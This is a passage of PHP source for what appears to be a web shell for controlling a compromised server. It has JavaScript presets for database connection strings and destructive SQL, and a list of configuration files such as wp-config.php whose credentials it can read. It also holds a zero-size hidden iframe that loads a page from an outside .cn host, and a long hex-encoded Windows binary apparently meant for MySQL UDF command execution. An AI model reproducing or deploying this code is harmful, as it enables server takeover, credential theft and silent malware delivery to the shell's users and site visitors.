  Str = new Array(12);  
	Str[1] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\db.mdb";
	Str[2] = "Driver={Sql Server};Server=,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[3] = "Driver={MySql};Server=;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[4] = "Provider=MSDAORA.1;Password=密码;User ID=帐号;Data Source=服务名;Persist Security Info=True;";
	Str[6] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[7] = "INSERT INTO [TableName](USER,PASS) VALUES(\'eanver\',\'mypass\')";
	Str[8] = "DELETE FROM [TableName] WHERE ID=100";
	Str[9] = "UPDATE [TableName] SET USER=\'eanver\' WHERE ID=100";
	Str[10] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[11] = "DROP TABLE [TableName]";
	Str[12] = "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[13] = "ALTER TABLE [TableName] DROP COLUMN PASS";
	if(i<=4){
	  DbForm.string.value = Str[i];
  }else{
  	DbForm.sql.value = Str[i];
  }
  return true;
  }');
}
elseif($num == "4"){
	html_n('function Fulll(i){
   if(i==0){
     return false;
   }
  Str = new Array(8);  
	Str[1] = "config.inc.php";
	Str[2] = "config.inc.php";
	Str[3] = "config_base.php";
	Str[4] = "config.inc.php";
	Str[5] = "config.php";
	Str[6] = "wp-config.php";
	Str[7] = "config.php";
	Str[8] = "mysql.php";
	sform.code.value = Str[i];
  return true;
  }');
}
html_n('</script>');
}

function css_left(){
	html_n('<style type="text/css">
	.menu{width:152px;margin-left:auto;margin-right:auto;}
	.menu dl{margin-top:2px;}
	.menu dl dt{top left repeat-x;}
	.menu dl dt a{height:22px;padding-top:1px;line-height:18px;width:152px;display:block;color:#FFFFFF;font-weight:bold;
	text-decoration:none; 10px 7px no-repeat;text-indent:20px;letter-spacing:2px;}
	.menu dl dt a:hover{color:#FFFFCC;}
	.menu dl dd ul{list-style:none;}
	.menu dl dd ul li a{color:#000000;height:27px;widows:152px;display:block;line-height:27px;text-indent:28px;
	background:#BBBBBB no-repeat 13px 11px;border-color:#FFF #545454 #545454 #FFF;
	border-style:solid;border-width:1px;}
	.menu dl dd ul li a:hover{background:#FFF no-repeat 13px 11px;color:#FF6600;font-weight:bold;}
	</STYLE>');
	html_n('<script language="javascript">
	function getObject(objectId){
	 if(document.getElementById && document.getElementById(objectId)) {
	 return document.getElementById(objectId);
	 }
	 else if (document.all && document.all(objectId)) {
	 return document.all(objectId);
	 }
	 else if (document.layers && document.layers[objectId]) {
	 return document.layers[objectId];
	 }
	 else {
	 return false;
	 }
	}
	function showHide(objname){
	  var obj = getObject(objname);
	    if(obj.style.display == "none"){
			obj.style.display = "block";
		}else{
			obj.style.display = "none";
		}
	}
	</script><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe><div class="menu">');
}

function css_main(){
	html_n('<style type="text/css">
	*{padding:0px;margin:0px;}
	body,td{font-size: 12px;color:#00ff00;background:#292929;}input,select,textarea{font-size: 12px;background-color:#FFFFCC;border:1px solid #fff}
	body{color:#FFFFFF;font-family:Verdana, Arial, Helvetica, sans-serif;
	height:100%;overflow-y:auto;background:#333333;SCROLLBAR-FACE-COLOR: #232323; SCROLLBAR-HIGHLIGHT-COLOR: #232323; SCROLLBAR-SHADOW-COLOR: #383838; SCROLLBAR-DARKSHADOW-COLOR: #383838; SCROLLBAR-3DLIGHT-COLOR: #232323; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #383838;}
	input,select,textarea{background-color:#FFFFCC;border:1px solid #FFFFFF}
    a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}
	.actall{background:#000000;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
	</STYLE><body style="table-layout:fixed; word-break:break-all; FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#626262,endColorStr=#1C1C1C)">
	<table width="85%" border=0 bgcolor="#555555" align="center">');
}

function css_foot(){
	html_n('</td></tr></table>');
}

function Mysql_shellcode()
{
	return "0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E00000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000009BBB9A02DFDAF451DFDAF451DFDAF451A4C6F851DDDAF4515CC6FA51CBDAF45137C5FE518BDAF451DFDAF451DCDAF451BDC5E751DADAF451DFDAF55184DAF45137C5FF51DCDAF45137C5F051DEDAF45152696368DFDAF4510000000000000000504500004C010300B2976A460000000000000000E0000E210B01060000500000001000000090000010E6000000A0000000F000000000001000100000000200000400000000000000040000000000000000000100001000000000000002000000000010000010000000001000001000000000000010000000D8F000007400000000F00000D80000000000000000000000000000000000000000000000000000004CF100000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000900000001000000000000000040000000000000000000000000000800000E055505831000000000050000000A000000048000000040000000000000000000000000000400000E055505832000000000010000000F0000000020000004C0000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000322E303200555058210D09020A459475C59FCC587632C900000F46000000B00000260A00BC6FEDDDFF558BEC6AFF6800007148040ED064A10507506489FFD8FF9F2583EC0C5356578965E8C745FC0F7D0C0175236A00FFEDB77B012E05B008FF150970008945E4EB09B81E7363BB0124C38B2FFF000F8B4DF05FF6FFD94E0D5F5E5B8BE55DC20C0090008B442499ACFDF604C740081C100432C0C30F8F58FDAC7D0081EC8C090592C685E8FBFF77DFBD6100B9FF1733C08DBDE90DF3AB66ABAA33DB895DFC8B33DBBBFF450C8338010F85770380480439190A6C53EFFEFFBF80988B50088B0250E80A005DDC83C40885C00F84511A889DC8F6F720276B414EC9F6C785BC0A9FD9DC5D0C16899DC0090FC4D853A1FBF6DF8D8D1A518D95CCFA06528D85B80D500EB399661B2C256C44246CCDF7EFB116288B852A8985ACF605A866EEEE8C6C559C985668050134776723CD95C852240CBFBA8883C9DFDCFFB7FF9CF2AEF7D12BF98BF78BFA8BD1100E4F8BCAC1B3CDFDF6E902F3A50683E103F3A4FBF2083566B604D88B393284B4C1B5DB60E6D8FBB153006A0103FF6B63838A538B20B4283BC3752D6A0A6D84436EF0E8FB1C4F473ADBAF3D7C12516670380B52E917059E0B67B30CF72A18B9D0FA40FB0E72106AD1FA6803FA8D1D93CBD8D84268FF14D0FAC47E0990583A548D64D9BA6F3EE5117E8BF089B564B9535EC803C2993B046AA18BB810CD2ED81B0E567420C63C10FFB9E53B72C6000163E8EBBA1882FBB7B9850436D41105B0596A206A03049D306B6E037D7EB2BF0CF6B171F37B6883FEFF6A85385618DCEFEF2D94F889BD408D4764A80FF652F1DC2F942DB9590C89036A9D5679F8CFBE564F01515030108B13C6043A0009446C03E40BD18B3BD9687E2C089318580C04EB366A64B66C8DC972D031745813594ECE0E53C16551C83BE920FDC91E498B5514890AE98B03E63F61EE23C368C80B6389500C3BD37C2939D8751A3233C07F3001BB709155357A0C83910DBB954511420C8651C8D391AC91AE8D513763F24C9552CDB0069B6CC2A4E96551C51C8B6C76695D530C1FA86CB243C27B0C298B5BA5C3A71B4F08A40F8B400C8674DD5B768C07BC91591B00130BC8AEF1B72C1D750683C8FFC2C30E05DCC030D74E060C74092FF202EDB4329054554468020217F6FEBFFE7134F7D81BC04081C41A5E903D814C060F6808B8640426B073A466121C866DCBB6417B885DA87401A902ADB17EE3D2B76603B58845B71684FEF1888590FFFE7D72BB06563F84BD910AE983CF3F4F9B2E347D942C6A02227175943B5A018CEDF7751616FC1708EC3F79044888FEFE71103BC7751D560A1BC60B6C14326A107A8D74235F61B8E73A52180F66DB8D2C2C88980B531CAE9A338FCA02DD827A1D0E203DB8C9B537DC9004B9827E8B3089CAB4D6D37CB01D80B471D337110CE748BEDDEC6F6A081AA8D177E6489E04A0B6138D55A8E327325A00438D7DA883CE2D656B0763CE457537E59B512FD8B7C1028B8B8596504522D9BE1B6144418D4DA885C977DD1696139C2E06249C238D472834160750D28954283B70800CF2C67526537547C84B6CC025CF070D048CFFFEDF5EBC8549E4200866E4516A28AE11DB6E61BC52F88D2072229D489AB3985D2C1D8B35781C88D11B302A6C37DF5968311659FFFF1151BE82B96D42D6FC84FED51052D985CD06A5091CEBC5BA94506052022C069E0F3981C511788FA404FCF68450228B75087CC0807E09060A4B775B71A85F8B5E0C20D469D9D115CEF92011C8B80D124CB6177EA98AB6E00FC1E0028BC803C604C468141ADF02CC33C98A7DBFB566FBEF5E4CC1E102058D14018955E0803A4D4F586F8F818BB9AA01CC8BF2E266F3A7ED0CF26C164102C0159D0542D875477205B04C2C3908C10D00DA6E0D67EF1968D007001034E90B8795BC59C82DED1533F607B80774C03FFB9009C183C206298A023C2167DF7FE9743C843B1B3C0A741788843530421B46D889846744EBDB7FB907CABBFF6F29B6B53C33D2F3A6753B88954C0BB918D962C860784DB34C76739038C0B10B6C68E803C59378271EEB254A1D8E236534B0301BB135728144C60F4F9400D7493C77C7030B5E382E81D8BB7F1A837C2410027513060405750C5B6464046B5F23C357084F179213C888140525F1ECA263810C5456C9134CD8C9C22CBD4FE485DBCEE499566BF6CFE0FA8BCB2BCE490C0804904BB80768042700E0FE397221F724434558E0FE8108D87B96002F8BFB1B2A2327837CD98BFACBCB5073BCC8855098E0FE8D6FBFAC03B7B10DCC63DC0DAF234B21D18DC47AF02AFA7A568F638FA2C0EB0C0354AD46F2C505EED48821B01A60A081C4112684C3CFF4425689FF3B77D77857040CB911280D108D7C2418F3AB8D4C243B0D069B6C1451AB343101BA0B041B0111E5724E64F06650720D553D8755FD04BA917466380E6E8D542408D731F62D925266181108435C5C8F4F4A761850514F9481106A5CDFBFEACC4044076C1589B424809674C67652DD247C03788C5FB65E56B87B49BCBFF0FF255B3CCCCC8D87D4E1674755E7F0FF42DF86C00D5F613C5D6C7904F74104868B23B8065423740F795CEFDCD7B7A5108902B863C33E1210506AFE5C908E7F40F864FF35A900198E1AB52529582FDDD5B4BFC0ED742E3B932474FA34768B0CB38959BD2DB50A02C304B394751268F7DBBFEDBD2DB37D0EAAFF5408EBC3648F0543236C7286EA8C1A648B9C8184FF83DF7904687510E3520C3951087505CF4D05BBFB5351BB1E18EB0A082489DFDCB7B64B02439D6B0C595BFCEF56433230069F0BF758433030F7A5FAFCD82C10DBD10C74F740E42682B58DD63E3F45F812E11B8D08B67F97AD3E21737B08C1618D0C76B18FEA6EED5F744556558D6B10A80B5D5E410B33BBE85ED633783C25534F0DD41D2B38D3AF560C0E168D36B7DEDDB6C5648F358F550C3B08C77EBF73301A8B348FEBA1B8DBEB1CC9EB15884DD67A5C003F5D16466F684394BC3B8B298B419FCC256BB4031824E1D763D9B66E20CF56BDE8C0E010E24785ED75EC423C0AE0DD5B0D1A7E4DE47F34168D5AFF3ADD766B1B92784D1C8020770D2450EDC3FF4884157559598BC65EC9C3CF8DDCFAF7D7B26B71151008C3B7E0772212C7424B4F0434A759913916BDF01C6C7410131E97DEB2C3568BB5FB05D7383B42565777216A091C1FF8ECA245FBA424020C91EF2059E1DB46ED38CEC7FD85F675032863FCDA7F5E83C60F83E6F056887CA4BCC65CE23B3A6BFC4D5716F6460C4074ECEFB75D15660CB2174D29730510B35652F790357329C54E308374342411FAFEE42B502AF7FF761007176F9B34F5DD7D0525EB128B461C530B5FD2A4D87B1C0059644B2A20B25628752EE34A467A86B386F62C591AE1D81E2DFA85EFFD0A7C092CE61D90280DE157F8ED397D08470F94C0485BC31630077AC31A6E5DF1025B5756391803BA23977D6097CA146A401A0CB8CDDCF7039B4DB4DD40743DFD6E78405720AC597B741356C220D7843337E11962410B5957B4C5DA2E6018CC07835328D00CBC3010E326ABA73DB884FB1147D903CB8BFEEA5A8A4614B8F01759C93A47FF7704A94949608563EF1B385B5E5FC93A00513D7DBB8B3B1C279772148111222E2D10B5B73FF685011773EC2BC88BC40C8BE18B596EB4A32D685036C10C576D747A9BF8BAEB74D9C614F7C64D8B197507F8B77803AB756FEB21F646880747497425FF6BCFBA26291F75EB2D1D5183E303740DEE5EEF66201D2F4B75F38492C3F7C79ED9E0FD2874123AFD8A116A9B3BE93AEE6C182EFA2AD1DBC2F6C82E89FEC7D074AFBAA5DB2FB523FEC70603D083F0E8C28B4F78E1BFF5C604A900948174DE84D2742C84641EF7C26FB7B7B90F580C070875C639EB18818C34DDA3E272090E00046A2BC45A88533F550A3B6CF7EBEE075F75F8B07585A3CCFFEFDE8DC6974E8A11F161698A7101DDBF2B74644F7719148A074638D07415D90BD3D2A573E30A0A75F5FC5F51E242173E10F0078D7E436102FE3B2A50DD4E1DC60238E075C48A410376EDDDEF31188A66FF83C11074DFEBB12F348AC26B74851B9030F28DBC0CC34C05C7DB88DFFC83F8F988CC078FA7DBC668BEA3068E58BEB2427EBB8EDE3CA10E680D075925DEC12DBDD1F7FB12102760891664950803C1EDDB50F3375C32F7750940EE78769BDDD8EB7256641CA4C03968098DCC7BB3D96D345204371B366231A8FF0519627F7FBBC8EB3E6B3BC1752C390D0D7EBDFF07E6FB0AFC0D8E90E128E6320E175A89D8331A64FBC25507514EADD87E11B259BF5833A569A363097D56B457C7105EBDC0D6BB09833D482926C101740547D36EA3040322DAA4C4E809F4AED9996EFFD0080CC113CC04BCB6D410BF4E0F07EB8D01C90C4C6D6FB0BB1737575023F6467926A315ED8034032125F71F0117396C115B083C5BD8B9E241C0D01A8DD4D8B1AE6176BA310E97D801DB78C041E03A9A3A3AD3C57DCD2A7D3B8130AB756C462D6C36BE025E10A882D2F6A840B9EEDAB61BED074AA96604071017DE6EBFF77F3F4E0824FE890E89462F1883657524EF0337F72D6E66A90C0115F981FE8B03BFC75A289C0748750BC03F32AE6ABFFDD7073E3EEE5966F7270801577467420BDCB65FAC3E2BF88D48390E581849A489DEB99EF04E047E10053CFE53DCEB3683FBF6CBFFDFBA198BCB8BC3C1F90583E01F8B0C8D93808D04C002B6F4B2D08196B88498F6F320F399B156A107783A260A4B2CD15C8A9E88E614B7C0C24A0D74885507DF40A12932DF4E0C20EB0FCC16B8760C7CEB080DC2C1C8A50E864C17064802DFBA95A1E6798A1F09DB8975F411BAD06E02EC890F0EF406D1B705D74A8D370641D00939554ABF7DF7EC0F8CDC1780FB207C1304787F0E0FBE50152EC08631717461EB02F8BE2DBCBB0F84C60E94C1F804A70789D00F879A85F652EC30FF24901DB2834803CBB22CDB55CC02D8E0E4FCDCBC6DBB4D5D1D954883E8E43B0403742DC1B55EA20B1F4848840DA8D2C56E6E594039FC082708041CB28C1D0111808002C3128E9EFB2AF9B9509B687613661E6CC80F8D12469B89985B8ED80E27B476CBB2ED170A666C4441D0EBE98AF03EED5C2E641EF0D305BF30E7CE63398D0489361B346FCBDB56AE2E046874206CB880FB7790495E2EA005804DFD10EEC6FFE4203F367514807F0134CA4747271FDA628680771888D0AA8568B7C6ED0D1C0FB6C3F66601802291EC50147E06131E28981DCEB0C18DCC35EB4733181652F39BE127F8670F8F1CE508650F8D9600F9EF43DB5811EBA9847817E8430F849FB96D5D836D70036C100CB8E903AF74A146C6BE3008CCC08B25430BFDF0BD68BEFACAC54BC21921D0ADAED4DEFB894DF844E7B1C92D0E2DE47EB981381229DC7477B37D212AD64E85D220D466833878869FED5DCA094040EBE721CC80C320136B1B74AB408FB8FDF3CAD14DDB955F708DCFF3F006CB1A0D8DAFF1660377862E8848BF578089043A953F5B008DD1D6C5F490323FD80C298EDDBEBDD35A7432040974C5487CE801521C97B3B345FE3A6C59882AF4471A183147BD2002BB8916359DDE6F2CF64580D9CCB97F74170FBF00D1E8E369E652D7D8C3AD2DDC000CBF0E94AE6DB4BE6E81344D50C28D8314670B2D826B25D5165C50CCA2B5AFD483C05E08F05D4B053B6C377540FC0EBCC8D18B851FB082B8F7855082FCC9C6057EB581E69E741429F0003506BE67B324205C595D12AF788432611654562D750DD0C2BB653A29BDB9E06157A758888D8459A619694899ED2C1D0C059E0684B686FB2C805184FD331B23B1CF05F77491C9C15DD4273C602621F62BC1D1F847FD340BDB0582F6288038AF03ECF1D728176B2624FE853D6B2815CC074DBB7B10D410A6FEF65D8A13C645EA3004516377CF60DF678845EBEB4821083BC202EB35D6852E09971B209909669F08CD2DF0EC668909050706F514EB0E296A403C0A69BF1FD6A05FA53A7959EB413D74218519637405404A0C0FBB641B0CF6C099EB250BB7C8F220AFC0ECC908EBE0070E19B8F5C6DB741BE37F177C1AC073115883D2D6E2C30D9FF7DA698BFAC90B1FDEE0B50577DC83E700B27D09161B2D08FD1B2AFCAA3AC0B6FBC60BC77509E40060B733D6DEADD55E614A7F0619EE0F765B5DFDF4995250578AC009C476409C5FDB6E372AC48B66C33007C017112CCBF6DF063E39677E03035DD440F8F847D75CF78818EBB5502B0C027F02A51AEE9B03611880393075A90A009BBBEB24400FC601301A98D825DEFEB1B6F4935DFCF6C3D226F6C716CF5A8386068A2D5C0F0A2BEB47369A970902740B20C1E475E06035B6ED2B75E402F4180C7884BDDB61A91B201EF0C41011CD7C37B703EA1402E45015342C9001D94C3E3104306F6B97DA893E7441058B7EFBBB0B97688E3B78FFDD034347C8502DFC54A443DE9D7E328DE9516EA164CF3B1759984FDB962DD802C7155802F4F860A50AC977AC79A5D7193808FBF97DF729B3456313F9E86DEC99D334B75BE01830031706216D30D1354DA4ACE11B7440C6126F55424F490478DC11BA6D6C74898A02FF0EB6300BB90233E098006C4E9468254A90D68C71D8A3AE4A83B557AFA9E0B06AEA7E21B618B714AB63DB43B9833E0D07207FE3B5B628B5908B5CE81A4BE6775DD73831263C1C35100FBE065746CDE7EC505F363FC34BE26D6C3C72BE9F580081008DAE0673520C083B4163B3A177D951FC1C661D6F8DE0B474E8500F41CC5204B4702D700B30027114E0550798688478EAA3365283702294BC5DF20D50600F6E85C0750F6C60A1FBCF373E5333DB391D15B4282D5DC3431B267E44D8B8013D0E74FB768AED8D700C5540785BFF36FFD70810E0916D800A6AFF7604626BC75EEAD59C14433B487CCED915DB812D1BB81D785DF6568CFDDB41DC7078158184FFD6077415CA2083644457D42DB983867CBE100A06FE2B8F3C763BD13474230774741B647413A8AE012344D398367B845CC52BDCFF007CC45A2067C106D76A07845D1003CA44F85083EAC716DE3C856C6C3407753E576A181F3B1A1F3C8BF8D4336A113542FB8D06BC59078C08005957750ADA0E78B31F78893EEB067A1D84D9607F865F281A805E5D60FF57605AA8B11584CC40A48B4F485801B7B87501172BC5D86E2508B00006B41217B770A0FBACC70505A48BBDA118AD96AFC18DB107B88858F0E16FC47314B5042B500C81FAB27207DB210C6FBB14EBE8EC321C556E34D5880C2E6A41DEF22BA3DF60A36A5AAFC2FC57C1EE7F37AA817FCE8B7AFC69C904D24B448D8C8E1A35C50144695D695685463BF80C13F6C1012E757FFDF4B46FFAED3F495F0B0C3BCF76038E8B4C13043B03BFF84D4BF4486783F920731CBF2CD3EFBFFB5FE88D4C01C4D7217CB044FE09752B752139EB2483C1EEC15CB0E01E2D21BCB0C4124AAEF174240679F04D42ADB519DB55890A040803630DDAD6FEBB088C8BFBC1FF044F83FF3F7B865F2F5167A8DBBDE197ECC4422BE20562AEA711A188F8495ADB5AF7E6A464760589F3CA411BFB40ED56E09F3E3BFA76028ABF746B2E9101DB4C69BE51BDBA16B9E491EAD22154111E96900F0BBDD221944C72B66DB152BF49BE4A0B04658BD6CA0811910EECB610F9D40939B68900B2F9295B73DD1B0B26892F0E05087FFB652B974A638A4C0704EF20884D0FFEC1FDEBE2BB880B7325807D0F55BB888BCFD3EBD81A25DB7609190DECB109B10BC436592924DC4FE019D821B8672559040F9D84B7F0DFC0F009388B54D0891A895C13FCFF086BAA0FB348FA4EB09CDFA6AFFFACEE0D0DA80EC1E10F03480CBB03B159E9581653513A1F32068B3D081C0950080E3940DDCDDE0D31A4886C570FFE48431C7BC39F0A481080794313836004FE118378D65AA61D106C5310785A124642882D0910C9F48D72F5388B15F21430C1C2B146DA282BC892110AD307BE708D48145170411C6D428DF767FA85B43B05223518BFEEEFD81496B88905ACEB0324A3AC8935B0493138532A6627F7AE142F68578D3C822C1B8E0ED3C6481776F0176A4934000B6FD57D0E56D3EE83EDFFEE0BE0B899EB1026BE33F6D3E80EC62D3E173049AC0F3BDF7FBF5D58E20873E14BE13B232B23FE0BCF75DDAE718B0B24143B9A1872E707756D26E4FB798BDA3BD8261505EBE6740BD7A019AC24C2837B3C3BD72A68891337EBED2681397B870D1B2FEEDBC8DC7646270B7B85DB90530E61DBE2F6BC595B1089FA43A8386C75EF6E6B071BE91406891DA5148B886F0BB016FAFEFC2D8B8C90C4B6B387FDAD904488378B127011557DA1A156DD1F000E440BD68B563077BF0B75178B91841CFF45FC04BF35EBA6FFFE23390BD774E98B97CA33FF5C5A741B87584D764C57CEE68DBA12C166EC645F9DBAED0AFD7C05D1E147EB752054F9430A2BE956EFEA7FF17BC1FE044EDE3F7EF83AC9DCB85E3BF79B0D0124617421206D207D2B11A27C383AEEFEB69CD3F3EC235C88448903FE0F75EA08B181F48E7B210BEB31172B5CBBC56895A1322119293673148215982C85220AA6D76593C07A04F80095AF3F4735D77A089084C5A97CF10348AD6D420CA522C264A974B32C06FE0B7D29C499C636576A0B331162BFB0CE6EBB64978C093B0A8F097CAEEB2FEF437AC0280D8D4EB6097B04B15C8F74B1BCAD16BEEE09376A2EB7F4AEF70B890A8903FCB2790DBFED56AE03D122011232FC9F8B34126FB70E218D790F3E751AA9B0A011A92BDC4B3BA406A49772C16B119C8D420408A1C41769A10220A489C09A6E6D44B6305F89507250D401E924E15797903B319841A10B889CC0930BF8653DB868C4411B45CBD81233305C81335C89834517F04610742A1B20655783363A63198CB014BDA5461C586460B47CB1856EAD4E24C5897E060562244A196A41B98BC36E74F1E051DF3771C84108343B5A2DDCC54FE043C331B63E6E3769C0815AFB3082C3026CB745EA40080204DE4A1E88D0AD5BFB85C1E7DF790C47A68686BDE88B3B08D13768ED4D2728B28D97101342773C47834BDB8D477748F283887EF4368379778D88FC06C740FCF0420EEFD0E77E01C24804C780E810140517EA0D7E3B48F09676C78B744F0CEDADFBC405F8FC015F2689AC8D4A0C087FB8BD6C8F41649E4442BC9EE38A46438A6F75D78DC80B84C07A884E43A30978047050608CBA2CCB687EA5266189BDC3ABA031BEAB17B614AB5ECCB80002BD063BC67D07EE07DA5BA319DB134451590D8DB535C5949808211256F4A0FA648B9018E21A33C9B874EBB7193D601519890476C020D46CEFC0D50884887CEA1CBA187C8A05A09A5BFE1134B5E055539F8B04865274C3F02F5E586F0A20C220418D82787CD1AD76BBA8A29BAC80448E8C458D3746DD05E97ADEE9B96A61A796EDDF72175F6877102B56F8C03B75466E436659C37CD780A065A52718F8141E1E722A5B76E9225120592139250384205934F449A884E2948073382CC6A1FE435607F644810401741D57A86F7264B348442A7448A3FCC6CF50E245D2C775C00ADB83F4E16C668AE85C39023A3E046A9095C4166A02CBDD6BC416264B1F593BC71C196610672B59CD696F29DA19821C24DFFF1D0A05DCDB4783A383E61FF3EF8A0635FAC7A40CF68064880400C60851AE70BF7F5F597D0FC1768182434EA883C3A8FC63B4B42A197808CA6681660CF7FB3360DBD2525E06900802042A635FC5A8648605C2F6FD1FE5EA460D409C6C48C5F7D8595E1B4B5F015E991B2E0C8957FBF609705C8080F9D53766A908E0B36F1368317B907E2657503BBFADE0401BD00E8B8074DC0DB4EB0E24FD07EB072483CBFF30351A9B81EF8B5FF6F5C154F85CC185B5ACF1279788D15A63F90E7A593917EDF118D97E74A1BBFFCDA30AA57A745FF6401D32AAC18561ECA218591A8517DFBB806DC11830AF01750F505222BC80D608851D37C597B58E4A50FF028B1A7536B654EC020BF841CEB04FF44A9DE370EC463B737C8CB1423914D98487B70160C37402FB5B36E42806FDA08A7477A50538839E890BA9639456E1A05FD68E48A06017858ED552908E4C6B80C4EAAF3109BB47752053951FDA5B57F7079E8D4614759F0658A54A340BA518EB56044261DBB65E097E123E0704C53F7CD5E1EE02115B5F5B5E95DD0001C3A150DC9BBA831B0B3F6116D080660DEE6118962668025B6C02664959538926F4317D0FAF7D10012334068B5B078BDF3C2E9A45D7CE0AA8AE74157E457AFB96A27C4014A78B7781E10868B1ABEDE67429191174229580AB1616697212F863F186A53FA9495C297E393EF62BDF017D321EBC6CD046147246CD63DA56A250177A4E74D391EDADDDBBD2F76B402BFAEB42FBE3F66B1935744701982BD83F1A608976723EB00729D10F234482252450E9D42E4AE0BE169FA44BA586D8080CF1A7264385F0385DD08157106F6A23B633A465C72B7483E7FE545B3CCF56C179148A0141CEF06CA387400E75F1B3ED814975AA01605E2CDD0623955CE88AFC2B32B9A7BA51C724A95E1306B6F57EA30719EBCD8D41FF559CC309824C32C9FEFDFCD126301C8687398FA4DF221A7A0BD2F86E8A073C61051BB4F4741A3C727C3CCC22BFD1D675FE0192EB20C99601EB08B909786157731209405A8A1D473AC31DB46DB6B5E33BD307DB60BEF652DB85C016547F3E601A2B74450475DBD6F21974360E61484CAC1F39FF2C98AD6108A328FC83C920EBB72F7D2063148E10EBA22240757D0BA54D6F0940EB982C7573E993E6006EA0B7FC0F0281CE0DEB82B8BA7D5C782AC8860BC834DB656274BE8BB60DCB2E070B42067540F6C5B6B7D8B7C73B80CD401E63F8752E5FF89315FE0A37E6FFBF9B16175DECD521CE84163A741DD9621B8DD20B418068A4D71362C3242210EA4C917EA9543C7DC4103BCB7D701A2C68DB12B73A896A89588018040859334A6C021C82005196FB871825A0590F8E9D7855AE209F1F3BC374377521509175ACB30D1BB16D14501D16E97FEBC4EBBA3CB1EB446A38C1E602C23268066B62600E56063A65306C327A7815DE4B1B96B3273CFB384F108C5F58DB56B604020CBF1F041C7EA1819D355975CC00D885F6E36DFF118DA424AB8D6406075AD5AA838AE5531FE0FEC7780B3708F7C2DB138A0A4238D974D18437EACF9683511275ED0BD857FBE310281E4BB5560893BFE5F8F18D6E5D33CB0365F983F1FFF0CF33BF3F4A3770C204EEF3751C250674D37F51D83AC508C1B475C45E357E0B5A808C8B42FC38D867A67BD33713EF38DC742717E7C1E81012157BD66E9ADC06D4EB962DB142FE377A38279D06FDFC0494C36B20EE5002FFD0371404E634449EEF32AC0E0400F3C3F32CC015505431F5DF64B1025F0E57299A11FC45438A3999947511064E18C1096C987394302FFE36C50C00E714892290881DC2F5115EDF753C8690D7C58C568D71E2EE112F52F07213AC9A83EE04883CDFC7349073ED5E972018AD20CF57A1102824851B7B7F8D5BC50BA35FC3816A9480BC60711B88116A0DEC08B25DB038E194D7730D70F6B55660C6FB6A192A6339BBB1C935A4F6C08490546A74E2A0D18E50ED8BF06B7875239F5A93565B8490A04018A50A8CFD37333859109C0462BF193868305333528CA116131E782F690E182FD118D1D80D41C3BB505244A06D10F00653BE5660368B9464F20D1CD94730B00D3F8A26684BC9911588EB227536D99B1059ACF545305BC392D09113D0022FDB610D506E746CF12499906D19450D283009999009384098EC9D9044503DEE10560B0EECA4FC00CA5E4F16D4E81A48506896046AD2546CF4691B8DA62874879FD9942100DE784F9B862947731E8085F74FECDD0EFF8BC646050AA127E253F4A8DF24051FEBDE784B518CBAC46620EA001F5B9B86281ABBC6388DD98DDD02AE1A81EA7D0851F8BAB787897C79E3677D56BE4C84983D04CB930D83839A1F6B556AC082C1731C806008F6D6A55960408B0E882481C1806DF5CC31E06D4D7CB76E8B130D1588092ACE4C3B04BCB1508BAAF926388A03BE126DB4BE32527572AABC04ACA41A4123404AFD37E0487D8B0989088A0B88488F05BE558B0AFC3BF77CB485016FF04E5B23333C81FFFDAD50BA3C754D290E2F75056AF658EB099B09BA92C348C397F50DC96E1BD0B84AFF7A175770340A9D800C5B0A25C1068D1B9906804BA40FEFB6700D540A0A700405804383FB6130F2E1037C97B89480B40638B491DEBE7B5E375778A8F0056E4673218D70837BFC00FB7DC26DAC0B7C2083C79683C324C8D00CBA2072E2854824720F338825B85473C487A01D94885B155434811237F8D58DCC6B8A069ED218A996783C3D74A756FA8DC26D4B140AC3E8F9BD581D3F9EF1C63B3BF3318E74410955BF1D267B41381F74395583D8ED8F348BE85945803F49225534521DBBCC54C02E579D4F6C67C4BEFD9A5903FD3775C95DFF84C28934C768BF1D0B891EAE9484015BA2BBB25983BDBE8A98994FC1A75456530DC0A15A84E38FA2848BFE3818747463A5FA7DA307FC5053539F37B4040B0CDB05C90488D486186DD8A46BD6A1082F2700C34A7424864635A6A08D355F485A6C9C9232B1458A68B14C18D147EFF317208321008B7510C700B50156B0802BEF4937A05BFFDFA0AE80382275448A50014080FA22FE84AE1B2FFFD274250FB6D2F68292610425FF012B3B3256FA068A108816F60BD5EBCE0C6E6FA11124CB46401CEB43F2B645C61E05044044DAF683D6DCFD5B1918881E4665207409090870ACF5F20975CC750348C34A66FF9A5AA946B5674EB5E003F0BE66442B052787A281993117C8BC15CE169739FF02FB0885FA5AD0B8225C75C8DA922C7FE1C6AD02752541397D6D0D807801228D86257A6BE31D8BC2EBA3080CF0DB770416180F94C28905D1EB8BD34B88F6EF02F30E4388C6065C46B16AADAE355980A74A4693682E4C67168A3F863D1306ACDBE32E2819E2061F7303C2091B0F400315016B43F850BF38A0300F0E95A9E1EE6EC70383278E140246DDD1306449258F9C5378446DA830D4E06CF633141A8DCD4D04D50E0B49180F407B7B21892